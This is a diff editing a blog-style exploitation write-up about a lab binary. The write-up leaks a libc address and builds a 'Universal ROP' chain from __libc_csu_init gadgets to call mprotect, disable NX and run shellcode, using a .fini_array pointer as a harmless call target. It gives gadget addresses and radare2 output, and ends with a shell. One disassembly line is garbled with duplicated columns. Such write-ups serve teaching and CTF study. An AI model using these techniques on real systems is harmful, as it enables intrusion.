@@ -185,7 +185,7 @@ $ checksec vuln
 
 <h1 id="the-approach">The approach</h1>
 
-<p>The issue with <code>NX</code> is that we cannot execute code in writable memory segment. So we should find a way to disable, at run-time, this protection.</p>
+<p>The issue with <code>NX</code> is that we cannot execute code in writable memory segment. So we should find a way to disable, <strong>at run-time</strong>, this protection.</p>
 
 <p>Fortunately the <code>mprotect</code> function, in libc, just do this:</p>
 
@@ -204,24 +204,25 @@ DESCRIPTION
 
 </code></pre>
 
-<p>So here is the plan:</p>
+<p>So here the exploit plan:</p>
 
 <ul>
+<li>Leak a function address in libc. In this way we can call mprotect</li>
 <li>Find a memory segment where we could write the shellcode</li>
 <li>Call mprotect to disable NX on that region</li>
 <li>Jump to that region</li>
 <li>Profit</li>
 </ul>
 
-<p>We write the shellcode starting from the <code>.got.plt</code> segment address.</p>
+<p>We leak the puts address and we write the shellcode starting from the <code>.got.plt</code> segment address.</p>
 
 <h1 id="exploitation">Exploitation</h1>
 
-<p>Universal ROP is a <em>general techinique</em> to build ROP chain on glibc x86_64 binary.</p>
+<p>To build the ROP chain we use a <em>general techinique</em>, usable on any glibc x86_64 binary, called <code>Universal ROP</code>.</p>
 
-<p>Basically we use the gadget in the <code>__libc_csu_init</code> function, included by glibc in any x86_64 binary, to populate rdi, rsi and rdx.</p>
+<p>Basically we use the gadgets in the <code>__libc_csu_init</code> function, included by glibc in any x86_64 binary, to populate rdi, rsi and rdx.</p>
 
-<p>These are the first three registers used to pass argument to a function in x86_64 convention.</p>
+<p>These are, in fact, the first three registers used to pass argument to a function in x86_64 convention.</p>
 
 <p>So we can call any function that accept <em>up</em> to three arguments, like <code>mprotect</code>.</p>
 
@@ -231,6 +232,9 @@ DESCRIPTION
 0x004011b3      4c89ee         mov rsi, r13
 0x004011b6      4489e7         mov edi, r12d
 0x004011b9      41ff14df       call qword [r15 + rbx*8]
+0x004011bd      4883c301       add rbx, 1
+0x004011c1      4839dd         cmp rbp, rbx
+0x004011c4      75ea           jne 0x4011b0
 0x004011c6      4883c408       add rsp, 8
 0x004011ca      5b             pop rbx
 0x004011cb      5d             pop rbp
@@ -238,10 +242,69 @@ DESCRIPTION
 0x004011ce      415d           pop r13
 0x004011d0      415e           pop r14
 0x004011d2      415f           pop r15
-0x004011d4      c3             ret
+						0x004011d3	5f	pop rdi
+0x004011d4      c3             ret		0x004011d4	c3	ret
 </code></pre>
 
-<p>And here the exploit:</p>
+<p><em>Note that there could be differences between glibc version. Currently I&rsquo;m using the <code>libc-2.29</code>. However the approach is the same.</em></p>
+
+<p>We can easily identify:</p>
+
+<ul>
+<li><code>pop rdi</code> to set rdi, at <code>0x004011d3</code>.</li>
+<li><code>pop r13</code> and <code>mov rsi, r13</code> to set rsi. At <code>0x004011ce</code> and <code>0x004011b3</code>.</li>
+<li><code>pop r14</code> and <code>mov rdx, r14</code> to set rdx. At <code>0x004011d0</code> and <code>0x004011b0</code>.</li>
+</ul>
+
+<p>However there are two issues to overwhelm before we can set rsi and rdx. In fact after the <code>mov</code> there are:</p>
+
+<ul>
+<li>The <code>call qword [r15 + rbx*8]</code> at <code>0x004011b9</code></li>
+<li>The <code>jne 0x4011b0</code> at <code>0x004011c4</code>.</li>
+</ul>
+
+<p>The latter should fail and this is is easily achievable because we control both <code>rbx</code> and <code>rbp</code> (thanks the pops at the bottom of the function). So we set rbx to 0 and rbp to 1.</p>
+
+<p>The former requires a bit of work..
+In fact <code>r15 + rbx*8</code> should point to an instruction in a executable segment and it should not interfer with our exploit..
+However because rbx is equal to 0 the condition is reduced only to <code>r15</code>. And we control it thanks the <code>pop r15</code> at the bottom of the function.</p>
+
+<p>Nonetheless.. What value <code>r15</code> should contain? A pointer to a function is an ideal candidate&hellip;</p>
+
+<p><strong>BINGO!</strong></p>
+
+<p>In every <code>ELF</code> executable there is a <code>.fini_array</code> section, that is an array of <em>pointer to functions</em>. These functions should be called when the program exit.</p>
+
+<p>Let&rsquo;s analyze this section with <code>r2</code>.</p>
+
+<pre><code>$ r2 -Ad vuln
+[r2]&gt; iS
+...
+19 0x00002e18     8 0x00403e18     8 -rw- .fini_array
+...
+[r2]&gt; pxr 8 @0x00403e18
+0x00403e18 0x0000000000401100   ..@..... @loc.__init_array_end 0
+[r2]&gt; pdf @0x0000000000401100
+    0x00401100      f30f1efa       endbr64
+    0x00401104      803d212f0000.  cmp byte [obj.completed.7387], 0
+,=&lt; 0x0040110b      7513           jne 0x401120
+|   ...
+|   ...
+|  0x00401116      c6050f2f0000.  mov byte [obj.completed.7387], 1
+|  0x0040111d      5d             pop rbp
+`-&gt;0x00401120      c3             ret
+</code></pre>
+
+<p>So if [obj.completed.7387] is different than 0 this function acts like a <code>NOP</code>. And at <code>0x00401116</code> [obj.completed.7387] is set to 1&hellip;</p>
+
+<p><strong>PERFECT! :D</strong></p>
+
+<p>We have all elements in place.</p>
+
+<p>So to recap: <code>r15</code> should contain the <code>.fini_array</code> address but before the first <code>ROP chain</code> we should call <code>0x00401116</code> to set <code>obj.completed.7387</code> to 1.
+In this way the <code>call</code> acts like a <code>NOP</code>.</p>
+
+<p>So here the exploit:</p>
 
 <pre><code class="language-python">#!/usr/bin/python2
 
@@ -353,10 +416,16 @@ t.close()
 [*] mprotect@libc: mprotect_address
 [+] DONE
 [*] Switching to interactive mode
-$ echo hi
-hi
+$ echo hi :)
+hi :)
 $
 </code></pre>
+
+<h2 id="references">References</h2>
+
+<ul>
+<li><a href="https://www.slideshare.net/inaz2/rop-illmatic-exploring-universal-rop-on-glibc-x8664-en-41595384">Universal ROP</a></li>
+</ul>
 </div>
 
     
